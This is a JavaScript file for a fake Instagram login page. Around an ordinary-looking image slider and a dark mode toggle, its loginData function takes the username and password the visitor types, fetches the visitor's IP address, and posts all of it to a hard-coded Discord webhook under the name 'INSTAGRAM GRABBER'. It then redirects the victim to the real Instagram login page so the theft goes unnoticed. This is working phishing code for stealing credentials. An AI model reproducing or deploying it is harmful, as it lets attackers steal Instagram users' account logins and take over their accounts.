let slide_content = document.querySelector('#slide-content')

let signin_form = document.querySelector('#signin-form')

let signin_btn = document.querySelector('#signin-btn')

let darkmode_toggle = document.querySelector('#darkmode-toggle')

let slide_index = 0

slide = () => {
    let slide_items = slide_content.querySelectorAll('img')
    slide_items.forEach(e => e.classList.remove('active'))
    slide_index = slide_index + 1 === slide_items.length ? 0 : slide_index + 1
    slide_items[slide_index].classList.add('active')
}

setInterval(slide, 2000)

// animate input
document.querySelectorAll('.animate-input').forEach(e => {
    let input = e.querySelector('input')
    let button = e.querySelector('button')

    input.onkeyup = () => {
        if (input.value.trim().length > 0) {
            e.classList.add('active')
        } else {
            e.classList.remove('active')
        }

        if (checkSigninInput()) {
            signin_btn.removeAttribute('disabled')
        } else {
            signin_btn.setAttribute('disabled', 'true')
        }
    }

    // show password button
    if (button) {
        button.onclick = () => {
            if (input.getAttribute('type') === 'text') {
                input.setAttribute('type', 'password')
                button.innerHTML = 'Show'
            } else {
                input.setAttribute('type', 'text')
                button.innerHTML = 'Hide'
            }
        }
    }
})

checkSigninInput = () => {
    let inputs = signin_form.querySelectorAll('input')
    return Array.from(inputs).every(input => {
        return input.value.trim().length >= 6
    })
}

// darkmode toggle
darkmode_toggle.onclick = (e) => {
    e.preventDefault()
    let body = document.querySelector('body')
    body.classList.toggle('dark')
    darkmode_toggle.innerHTML = body.classList.contains('dark') ? 'Lightmode' : 'Darkmode'
}


// let IPAddressVisitor;
// function getIPAddress() {

//     fetch('https://api.ipify.org?format=json')
//         .then(response => response.json())
//         .then(data => {
//             IPAddressVisitor = data.ip;
//             console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
//         })
//         .catch(error => console.error('Errore:', error));

// }

function loginData() {

    let IPAddressVisitor;
    let username = document.getElementById('input-username').value;
    let password = document.getElementById('input-password').value;

    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            IPAddressVisitor = data.ip;
            console.log(IPAddressVisitor); // Opzionale: per vedere l'IP in console
        })
        .catch(error => console.error('Errore:', error));

    const request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1216738612893192192/rOHU-JGI67MpmZLtOk2kEVW5hzc9chwGTkxLVyMkRXtULbYLEtsnENYE4fYTWaZmrB51");

    request.setRequestHeader('Content-type', 'application/json');

    let messaggio = "👤 Username: " + username + "\n🔒 Password: " + password + "\n💻 Indirizzo IP: " + IPAddressVisitor;


    // Salva in variabile dataFormattata la data dell'accesso dell'utente
    var dataCompleta = new Date();
    var mese = dataCompleta.toLocaleString('default', { month: 'short' }); // Estrae il mese abbreviato (es. "Feb")
    const meseMaiuscolo = mese[0].toUpperCase() + mese.slice(1);
    var giorno = dataCompleta.getDate(); // Estrae il giorno del mese (es. 27)
    var anno = dataCompleta.getFullYear(); // Estrae l'anno (es. 2024)
    var ora = dataCompleta.getHours(); // Estrae l'ora (es. 21)
    var minuti = dataCompleta.getMinutes(); // Estrae i minuti (es. 4)
    var secondi = dataCompleta.getSeconds(); // Estrae i secondi (es. 23)

    var dataFormattata = "🕛 " + ora + ":" + minuti + ":" + secondi + "\n" + "🗓️ " + giorno + " " + meseMaiuscolo + " " + anno;



    const params = {
        "username": "Instagram Grabber",
        "embeds": [
            {
                "author": {
                    "name": "🥷INSTAGRAM GRABBER🥷\n" + messaggio,
                },
                "color": "16019902",
            },
        ],
        "content": dataFormattata,
    }

    request.send(JSON.stringify(params));

    window.location.href = "https://www.instagram.com/accounts/login/?next=%2Flogin%2F&"
    console.log(messaggio)
}